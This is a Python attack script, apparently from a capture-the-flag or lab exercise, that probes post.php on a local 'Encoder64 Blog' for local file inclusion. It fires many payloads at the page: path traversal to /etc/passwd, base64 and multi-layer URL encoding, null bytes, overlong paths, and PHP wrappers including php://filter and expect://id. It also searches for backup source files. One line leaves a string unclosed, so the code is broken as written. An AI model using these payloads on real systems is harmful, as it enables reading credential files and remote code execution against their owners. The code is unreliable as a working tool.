import requests
import base64
import urllib.parse
import re

BASE_URL = "http://127.0.0.1:33209"
TARGET_FILE = "../../../../etc/passwd"  # Classic LFI target

print("=" * 80)
print("LFI Bypass Testing for Encoder64 Blog - post.php")
print("=" * 80)

# Test 1: Different parameter names with basic LFI
parameter_names = ["id", "page", "file", "article", "post", "content", "view"]
print("\n[TEST 1] Testing different parameter names with basic LFI payload")
print("-" * 80)

successful_params = []
for param in parameter_names:
    url = f"{BASE_URL}/post.php?{param}={TARGET_FILE}"
    try:
        resp = requests.get(url, timeout=10)
        print(f"\n[*] Testing {param}=...")
        print(f"URL: {url}")
        print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
        
        # Check if we got etc/passwd content
        if "root:" in resp.text and "bin/bash" in resp.text:
            print(f"[!] SUCCESS - Found /etc/passwd content with parameter: {param}")
            successful_params.append(param)
            print(f"Response preview: {resp.text[:500]}")
        elif resp.status_code == 200 and len(resp.content) > 100:
            # Might be partial success, print content
            print(f"[+] Got response (potential filter bypass needed): {len(resp.text)} chars")
            print(f"Preview: {resp.text[:200]}")
        elif resp.status_code != 404:
            print(f"[-] Response status: {resp.status_code}")
    except Exception as e:
        print(f"[-] Error: {e}")

print(f"\n[*] Parameters that returned success: {successful_params}")

# Test 2: Base64 encoding variations
if successful_params:
    test_param = successful_params[0]
else:
    test_param = "id"  # Default to "id" if none worked

print("\n[TEST 2] Testing Base64 encoding variations")
print("-" * 80)
print(f"Using parameter: {test_param}")

# Encode just the filename
filename_only = "../../../../../etc/passwd"
filename_b64 = base64.b64encode(filename_only.encode()).decode()
url_b64_filename = f"{BASE_URL}/post.php?{test_param}={filename_b64}"

print(f"\n[*] Base64 encode just filename: {filename_b64}")
try:
    resp = requests.get(url_b64_filename, timeout=10)
    print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
    if "root:" in resp.text:
        print(f"[!] SUCCESS - Base64 encoded filename worked!")
        print(f"Response: {resp.text[:500]}")
except Exception as e:
    print(f"[-] Error: {e}")

# Encode entire path segments
path_encoded = "
for segment in TARGET_FILE.split("/"):
    if segment:
        segment_b64 = base64.b64encode(segment.encode()).decode()
        path_encoded += f"/{segment_b64}"
    else:
        path_encoded += "/"

url_b64_path = f"{BASE_URL}/post.php?{test_param}={path_encoded}"
print(f"\n[*] Base64 encode path segments: {path_encoded[:100]}...")
try:
    resp = requests.get(url_b64_path, timeout=10)
    print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
    if len(resp.content) > 100:
        print(f"Preview: {resp.text[:200]}")
except Exception as e:
    print(f"[-] Error: {e}")

# Test 3: URL encode Base64 string
double_encoded = urllib.parse.quote(filename_b64)
url_double_enc = f"{BASE_URL}/post.php?{test_param}={double_encoded}"

print(f"\n[TEST 3] Double encoding (Base64 + URL encode)")
print("-" * 80)
print(f"URL encode the Base64: {double_encoded}")
try:
    resp = requests.get(url_double_enc, timeout=10)
    print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
    if len(resp.content) > 100:
        print(f"Preview: {resp.text[:200]}")
except Exception as e:
    print(f"[-] Error: {e}")

# Triple encoding (URL encode twice)
triple_encoded = urllib.parse.quote(double_encoded)
url_triple_enc = f"{BASE_URL}/post.php?{test_param}={triple_encoded}"

print(f"\n[*] Triple encoding (Base64 + double URL encode):")
print(f"URL: {url_triple_enc}")
try:
    resp = requests.get(url_triple_enc, timeout=10)
    print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
    if len(resp.content) > 100:
        print(f"Preview: {resp.text[:200]}")
except Exception as e:
    print(f"[-] Error: {e}")

# Test 4: Mixed encoding
print("\n[TEST 4] Mixed encoding (partial Base64, partial plain)")
print("-" * 80)

mixed_payloads = [
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded traversal
    "..%2F..%2F..%2F..%2F" + base64.b64encode(b"etc/passwd").decode(),  # Mixed
    base64.b64encode(b"../../../").decode() + "/etc/passwd",  # Mixed reverse
    "..%2F" + base64.b64encode(b"../").decode() + "..%2Fetc%2Fpasswd"  # Complex mixed
]

for i, payload in enumerate(mixed_payloads):
    print(f"\n[*] Mixed encoding {i+1}:")
    url = f"{BASE_URL}/post.php?{test_param}={payload}"
    print(f"Payload: {payload[:100]}...")
    try:
        resp = requests.get(url, timeout=10)
        print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
        if len(resp.content) > 100:
            print(f"Preview: {resp.text[:200]}")
    except Exception as e:
        print(f"[-] Error: {e}")

# Test 5: Null byte injection
print("\n[TEST 5] Null byte injection")
print("-" * 80)

null_byte_payloads = [
    "../../../../etc/passwd%00",
    "../../../../etc/passwd%00.html",
    base64.b64encode(b"../../../../etc/passwd").decode() + "%00",
    "../../../../etc/passwd\x00",
]

for i, payload in enumerate(null_byte_payloads):
    print(f"\n[*] Null byte test {i+1}:")
    url = f"{BASE_URL}/post.php?{test_param}={payload}"
    print(f"Payload: {payload[:100]}...")
    try:
        resp = requests.get(url, timeout=10)
        print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
        if len(resp.content) > 100:
            print(f"Preview: {resp.text[:200]}")
    except Exception as e:
        print(f"[-] Error: {e}")

# Test 6: Path length tricks
print("\n[TEST 6] Path length tricks (>4096 chars)")
print("-" * 80)

long_path = "./" * 2000 + "../../../../etc/passwd"  # ~8000 chars
long_url = f"{BASE_URL}/post.php?{test_param}={long_path}"
print(f"[*] Using path length: {len(long_path)} characters")
try:
    resp = requests.get(long_url, timeout=10)
    print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
    if len(resp.content) > 100:
        print(f"Preview: {resp.text[:200]}")
except Exception as e:
    print(f"[-] Error: {e}")

# Test 7: PHP wrapper techniques
print("\n[TEST 7] PHP wrapper techniques")
print("-" * 80)

wrapper_payloads = [
    # php://filter with base64 encoding
    "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
    "php://filter/read=convert.base64-encode/resource=../../../../etc/passwd",
    
    # php://filter with chained filters
    "php://filter/convert.base64-encode|convert.base64-encode/resource=../../../../etc/passwd",
    
    # php://input (might allow RCE if combined with include)
    "php://input",
    
    # data:// wrapper
    "data://text/plain,test",
    
    # expect:// wrapper (for RCE if enabled)
    "expect://id",
    
    # With encoding
    base64.b64encode(b"php://filter/convert.base64-encode/resource=../../../../etc/passwd").decode(),
]

for i, payload in enumerate(wrapper_payloads):
    print(f"\n[*] Wrapper test {i+1}:")
    url = f"{BASE_URL}/post.php?{test_param}={payload}"
    print(f"Payload: {payload[:100]}...")
    try:
        resp = requests.get(url, timeout=10)
        print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
        
        # Check for base64 encoded content
        if len(resp.content) > 100 and resp.text.count('\n') < 5:
            # Might be base64, try to decode
            try:
                decoded = base64.b64decode(resp.text.strip()).decode('utf-8', errors='ignore')
                print(f"[!] Decoded base64 response: {decoded[:300]}")
                if "root:" in decoded:
                    print(f"[!] SUCCESS - Found /etc/passwd via wrapper!")
            except:
                pass
        elif len(resp.content) > 100:
            print(f"Preview: {resp.text[:200]}")
    except Exception as e:
        print(f"[-] Error: {e}")

# Test 8: POST parameter
print("\n[TEST 8] Testing POST parameter")
print("-" * 80)

try:
    resp = requests.post(
        f"{BASE_URL}/post.php",
        data={"id": "../../../../etc/passwd"},
        timeout=10
    )
    print(f"[*] POST request with id=../../../../etc/passwd")
    print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
    if len(resp.content) > 100:
        print(f"Preview: {resp.text[:200]}")
except Exception as e:
    print(f"[-] Error: {e}")

# Test POST with base64 encoded
base64_target = base64.b64encode(b"../../../../etc/passwd").decode()
try:
    resp = requests.post(
        f"{BASE_URL}/post.php",
        data={"id": base64_target},
        timeout=10
    )
    print(f"\n[*] POST with base64 encoded payload")
    print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
    if len(resp.content) > 100:
        print(f"Preview: {resp.text[:200]}")
except Exception as e:
    print(f"[-] Error: {e}")

# Test 9: Backup/hidden files
print("\n[TEST 9] Testing backup/hidden files")
print("-" * 80)

backup_files = [
    "post.php.bak",
    "post.php.old",
    "post.php~",
    ".post.php.swp",
    "post.php.save",
    "post.php.orig",
    "post.php.backup",
    "post.php.txt",
    "post.log",
    "post.php.log",
    ".post.php",
    "post.php.inc",
    "post.inc",
    "post.php.dist",
    "post.php.copy",
    "post.php.save.1",
    "post.php.save.2"
]

for backup_file in backup_files:
    url = f"{BASE_URL}/{backup_file}"
    print(f"\n[*] Testing {backup_file}")
    try:
        resp = requests.get(url, timeout=10)
        print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
        
        if resp.status_code == 200 and len(resp.content) > 0:
            # Check if it's source code
            if "<?php" in resp.text or "<?=" in resp.text:
                print(f"[!] FOUND PHP SOURCE CODE in {backup_file}!")
                print(f"Content preview:\n{resp.text[:800]}")
                
                # Look for parameter names in source
                print(f"\n[+] Looking for parameter names in source...")
                if "$_GET" in resp.text or "$id" in resp.text or "$_REQUEST" in resp.text:
                    print(f"Found potential parameters in source code!")
                    
                # Search for base64_decode or similar functions
                if "base64" in resp.text.lower():
                    print(f"[!] Found base64-related functions in source code!")
                    print(f"This confirms Base64 encoding is used!")
                    
                # Search for file operations
                if "include(" in resp.text or "require(" in resp.text or "file_get_contents(" in resp.text:
                    print(f"[!] Found file operation functions - LFI confirmed!")
                    
                print(f"\nFull source:\n{resp.text}")
        elif resp.status_code != 404:
            print(f"Non-404 response: {resp.text[:200]}")
    except Exception as e:
        print(f"[-] Error: {e}")

# Test accessing post.php with LFI to get its source
print("\n[*] Attempting to get post.php source via LFI")
try:
    resp = requests.get(
        f"{BASE_URL}/post.php?{test_param}=php://filter/convert.base64-encode/resource=./post.php",
        timeout=10
    )
    if len(resp.content) > 100 and resp.text.count('\n') < 5:
        try:
            # Try to decode if it's base64
            decoded = base64.b64decode(resp.text.strip()).decode('utf-8', errors='ignore')
            print(f"[!] SUCCESS - Got post.php source via php://filter!")
            print(f"Source code:\n{decoded[:1000]}")
            
            # Look for how the parameter is processed
            if "base64_decode" in decoded or "base64" in decoded.lower():
                print(f"[!] Found base64_decode usage in source!")
                
            # Extract parameter handling
            param_lines = [line for line in decoded.split('\n') if '$' in line and ('GET' in line or 'REQUEST' in line or '_id' in line)]
            print(f"\n[+] Parameter handling logic:")
            for line in param_lines:
                print(f"  {line.strip()}")
                
        except:
            print(f"Could not decode base64 response")
    else:
        print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
        if len(resp.content) > 100:
            print(f"Response: {resp.text[:200]}")
except Exception as e:
    print(f"[-] Error: {e}")

print("\n" + "=" * 80)
print("Testing complete")
